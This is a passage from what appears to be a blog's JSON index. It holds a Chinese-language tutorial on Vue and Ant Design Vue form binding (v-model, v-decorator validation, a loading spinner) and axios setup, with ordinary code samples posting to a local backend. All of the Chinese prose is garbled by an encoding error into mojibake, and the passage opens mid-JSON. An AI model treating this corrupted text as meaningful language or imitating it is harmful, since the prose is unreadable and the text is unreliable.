&#125; 9.å®ç°ç›‘å¬æ•°æ®åœ¨ä¹‹å‰çš„layuiçš„æ—¶å€™ï¼Œå› ä¸ºæˆ‘ä¸ä¼šå¯¹æ•°æ®è¿›è¡Œç»‘å®šï¼Œæ‰€ä»¥å¾€å¾€é€ æˆè‡ªå·±è¦å†™å¾ˆå¤šçš„type=hidenï¼Œæˆ–è€…å¿…é¡»æ„é€ formè¡¨å•çš„æƒ…å†µï¼Œè€Œä½¿ç”¨æ¡†æ¶ä¹‹åå¯ä»¥é€šè¿‡v-modelæ“ä½œç®€å•çš„å®ç°è¿™ä¸ªæ•ˆæœï¼Œ ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536&lt;a-form-model-item style=&quot;margin: 0px 10px 0px 00px&quot; class=&quot;selectAddress&quot;&gt; &lt;a-input type=&quot;password&quot; placeholder=&quot;logKey&quot; v-model=&quot;attackAddressName&quot;&gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;lock&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-model-item&gt; &lt;a-form-model-item class=&quot;selectButton&quot;&gt; &lt;a-button type=&quot;primary&quot; html-type=&quot;submit&quot; @click=&quot;selectAddress($event)&quot; &gt; æ·»åŠ  &lt;/a-button&gt; &lt;/a-form-model-item&gt;//åœ¨JSä»£ç ä¸­ï¼šselectAddress:function(event)&#123; // console.log(this.attackAddressName) let formAddress = new FormData(); formAddress.append(&#x27;logname&#x27;, this.attackAddressName) // console.log(formAddress.get(&#x27;logname&#x27;)) this.spinning = true; axios.post(&#x27;/setting&#x27;,formAddress).then(res =&gt;&#123; let earchData =JSON.parse(res.data) // console.log(res.data) this.china(earchData); this.spinning = false; &#125;).catch(err =&gt;&#123; console.log(err); &#125;) &#125; æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘å¹¶æ²¡æœ‰å†™formè¡¨å•ï¼Œè€Œæˆ‘ä¾ç„¶å¯ä»¥å®ç°æäº¤æ•°æ®ï¼Œæ˜¯å› ä¸ºä½¿ç”¨v-modelç›‘å¬ä¹‹åï¼Œè¯¥inputè¾“å…¥æ¡†çš„å†…å®¹è¢«JSå®æ—¶ç›‘æ§ç€ã€‚ 10.ç›‘å¬çš„å¦™ç”¨åˆ©ç”¨ç›‘å¬ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾çš„å®Œæˆå¯¹ä¸€äº›çœ‹èµ·æ¥å¾ˆé…·ç‚«çš„ç‰¹æ•ˆï¼Œæ¯”å¦‚ï¼Œå¦‚æœç”¨æˆ·æƒ³è¦æäº¤ç‚¹å‡»ä¸€ä¸ªæŒ‰é’®ï¼Œå°±éœ€è¦å¡«å†™å‡ ä¸ªinputæ¡†ï¼Œå¹¶ä¸”å¦‚æœæ¡†æ˜¯ç©ºçš„ï¼Œè¿˜å¯ä»¥ç»™å‡ºæç¤ºç­‰ç­‰ï¼Œè¿™é‡Œä¸¾å‡ºä¸€ä¸ªä¾‹å­ï¼Œæ¯”å¦‚ï¼š 123456789101112&lt;!-- ç”¨æˆ·ååˆ¤æ–­ --&gt; &lt;a-form-item :validate-status=&quot;userNameError() ? &#x27;error&#x27; : &#x27;&#x27;&quot; :help=&quot;userNameError() || &#x27;&#x27;&quot;&gt; &lt;a-input v-decorator=&quot;[ &#x27;userName&#x27;, &#123; rules: [&#123; required: true, message: &#x27;Please input your username!&#x27; &#125;] &#125;, ]&quot; placeholder=&quot;Username&quot; &gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;user&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-item&gt; é¡ºä¾¿ä¸€æï¼Œ ç”¨:å¼•å·å†™å…¥çš„ä¸œè¥¿ï¼Œä¸€èˆ¬æˆ‘ä»¬æ˜¯ç”¨äºæ¡ä»¶åˆ¤æ–­ï¼Œæ¯”å¦‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°±æ˜¯åˆ©ç”¨è¿™ä¸ªå»åˆ¤æ–­userNameErrorçš„çŠ¶å†µ åœ¨methodså½“ä¸­ï¼Œæˆ‘ä»¬æ„é€ å¦‚ä¸‹ä»£ç ï¼š 1234userNameError() &#123; const &#123; getFieldError, isFieldTouched &#125; = this.form; return isFieldTouched(&#x27;userName&#x27;) &amp;&amp; getFieldError(&#x27;userName&#x27;); &#125;, åœ¨dataå½“ä¸­ï¼š 123456data() &#123; return &#123; hasErrors, form: this.$form.createForm(this, &#123; name: &#x27;getWebsocket&#x27; &#125;), &#125;; &#125;, å®˜æ–¹æ˜¯å¦‚ä¸‹è§£é‡Šçš„ï¼š v-decorator æ˜¯ Ant Design çš„æ§ä»¶éªŒè¯å±æ€§ã€‚ ç»è¿‡ getFieldDecorator æˆ– v-decorator åŒ…è£…çš„æ§ä»¶ï¼Œè¡¨å•æ§ä»¶ä¼šè‡ªåŠ¨æ·»åŠ  valueï¼ˆæˆ– valuePropName æŒ‡å®šçš„å…¶ä»–å±æ€§ï¼‰ onChangeï¼ˆæˆ– trigger æŒ‡å®šçš„å…¶ä»–å±æ€§ï¼‰ï¼Œæ•°æ®åŒæ­¥å°†è¢« Form æ¥ç®¡ï¼Œè¿™ä¼šå¯¼è‡´ä»¥ä¸‹ç»“æœï¼š ä½ ä¸å†éœ€è¦ä¹Ÿä¸åº”è¯¥ç”¨ onChange æ¥åšåŒæ­¥ï¼Œä½†è¿˜æ˜¯å¯ä»¥ç»§ç»­ç›‘å¬ onChange ç­‰äº‹ä»¶ã€‚ ä½ ä¸èƒ½ç”¨æ§ä»¶çš„ value defaultValue ç­‰å±æ€§æ¥è®¾ç½®è¡¨å•åŸŸçš„å€¼ï¼Œé»˜è®¤å€¼å¯ä»¥ç”¨ getFieldDecorator æˆ– v-decorator é‡Œçš„ initialValueã€‚ ä½ ä¸åº”è¯¥ç”¨ v-modelï¼Œå¯ä»¥ä½¿ç”¨ this.form.setFieldsValue æ¥åŠ¨æ€æ”¹å˜è¡¨å•å€¼ã€‚ ä¹Ÿå°±æ˜¯è¯´è¿™ç§æ–¹å¼æ˜¯å§formç”±Vueå½»åº•æ‰˜ç®¡äº†~å’Œä¹‹å‰çš„ä¸åŒï¼Œä¼šè‡ªåŠ¨åˆ¤æ–­æ˜¯å¦å­˜åœ¨å€¼ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°†ä¼šè°ƒç”¨v-decoratorã€‚å½“ç„¶è¿™ç§æ–¹å¼æˆ‘æ˜¯æ¯”è¾ƒæ¨¡ç³Šçš„ï¼ŒçœŸè¦è¯´æˆ‘æ¯”è¾ƒç†è§£çš„æ˜¯å¦å¤–ä¸€ä¸ªå½¢å¼ 11.v-modelçš„å¦™ç”¨åœ¨htmlå½“ä¸­å†™ä¸‹ï¼š 12345678910111213141516171819&lt;a-form-model-item style=&quot;margin: 0px 10px 0px 00px&quot; class=&quot;selectAddress&quot;&gt; &lt;a-input type=&quot;password&quot; placeholder=&quot;logKey&quot; v-model=&quot;attackAddressName&quot;&gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;lock&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-model-item&gt; &lt;a-form-model-item class=&quot;selectButton&quot;&gt; &lt;a-button type=&quot;primary&quot; html-type=&quot;submit&quot; @click=&quot;selectAddress($event)&quot; &gt; æ·»åŠ  &lt;/a-button&gt; &lt;/a-form-model-item&gt;&lt;a-alert message=&quot;è¾“å…¥keyï¼Œå³å¯è‡ªåŠ¨æº¯æº&quot; type=&quot;info&quot; class=&quot;fontKey&quot; /&gt; &lt;a-spin size=&quot;large&quot; class=&quot;spinner&quot; :spinning=&quot;spinning&quot; :delay=&quot;delayTime&quot; /&gt; æ³¨æ„è¿™é‡Œçš„spinningï¼Œæˆ‘ä»¬ç»™å¥¹è¿›è¡Œæ‰˜ç®¡ï¼Œå¦‚æœå¯ä»¥çš„è¯ï¼Œè€Œspinningçš„æœŸæœ›é»˜è®¤å€¼åœ¨dataå½“ä¸­æ„é€ ï¼š 1234567data()&#123; return&#123; attackAddressName:&#x27;&#x27;, spinning: false, delayTime: 500, &#125; &#125;, è€Œå½“æˆ‘ä»¬ç‚¹å‡»æŒ‰é’®å‘é€æ•°æ®ä¹‹åï¼š 123456789101112131415161718selectAddress:function(event)&#123; // console.log(this.attackAddressName) let formAddress = new FormData(); formAddress.append(&#x27;logname&#x27;, this.attackAddressName) // console.log(formAddress.get(&#x27;logname&#x27;)) this.spinning = true; axios.post(&#x27;/setting&#x27;,formAddress).then(res =&gt;&#123; let earchData =JSON.parse(res.data) // console.log(res.data) this.china(earchData); this.spinning = false; &#125;).catch(err =&gt;&#123; console.log(err); &#125;) &#125; ä¸€æ—¦æ•°æ®æˆåŠŸå‘é€è¿‡å»ï¼Œæˆ‘ä»¬å°±å°†spinningçš„å€¼æ”¹æˆtrueï¼Œè¿™æ ·å°±å¯ä»¥æ˜¾ç¤ºäº†ï¼Œå½“è·å–æ•°æ®ä¹‹åï¼Œæˆ‘ä»¬å°±æ”¹æˆfalseï¼Œè®©ä»–æ¶ˆå¤±å³å¯ axios part1.aioxå‘é€æ•°æ®axiosæ˜¯ä¸€ä¸ªç»„ä»¶ï¼Œç”¨äºå‘é€æ•°æ®ç»™åç«¯ï¼Œç›¸å½“å¥½ç”¨ï¼Œæˆ‘ä»¬ä¸ºäº†é™ä½ä»£ç è€¦åˆæ€§ï¼Œåº”è¯¥æŠ“é—¨å»ºç«‹ä¸€ä¸ªaxiosæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”è®¾ç½®ä¸€ä¸ªhttp.jsï¼Œå„ç§å„æ ·çš„è®¾ç½®æˆ‘ä»¬éƒ½åœ¨axioså½“ä¸­è¿›è¡Œé…ç½®å³å¯ï¼š 12345import axios from &#x27;axios&#x27;axios.defaults.baseURL = &#x27;http://localhost:8081&#x27;;axios.defaults.timeout = 1000000;axios.defaults.withCredentials = true ä¾‹å¦‚è¿™æ ·ï¼Œå°±æ˜¯è®¾ç½®äº†é»˜è®¤çš„urlï¼Œè®¾ç½®è¶…æ—¶äº‹ä»¶ï¼Œå¸¦ä¸Šcookiesç­‰ç­‰ï¼Œè€Œaxiosçš„ä½¿ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œæ„é€ å¦‚ä¸‹ï¼š 12345678910111213axios.post(&quot;/login&quot;,formData,config).then(res =&gt; &#123; if(res.data == 0 )&#123; alert(&quot;è´¦å·æˆ–å¯†ç é”™è¯¯ï¼&quot;) &#125; else&#123; this.$message.success(` login successfully!`); router.push(&#123; path:&quot;/upload&quot; &#125;) &#125; &#125;).catch(err =&gt; &#123; console.log(err) &#125;); axios.get/post axios.get().theml().catch() åœ¨thenå’Œcatå½“ä¸­å»å†™åˆ«çš„ä¸œè¥¿ï¼Œä¸Šå›¾å½“ä¸­çš„res.dataä¸ºAPIç»™å›æ¥çš„æ•°æ®ï¼ŒæˆåŠŸä¹‹årouter.pushå°±å¯ä»¥è®©é¡µé¢è¿›è¡Œè·³è½¬äº† æ€»ç»“æ„Ÿè§‰è‡ªå·±æ˜¯è¾¹å­¦è¾¹å†™çš„ï¼Œå­¦åˆ°åé¢çš„æ—¶å€™æ„Ÿè§‰ä¹‹å‰çš„ä¸œè¥¿è¿˜å¯ä»¥åšå¾—æ›´å¥½ï¼Œä½†æ˜¯è“ç‹—äº†ï¼Œå·²ç»ä¸æƒ³åŠ¨äº†orz","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]}],"categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]}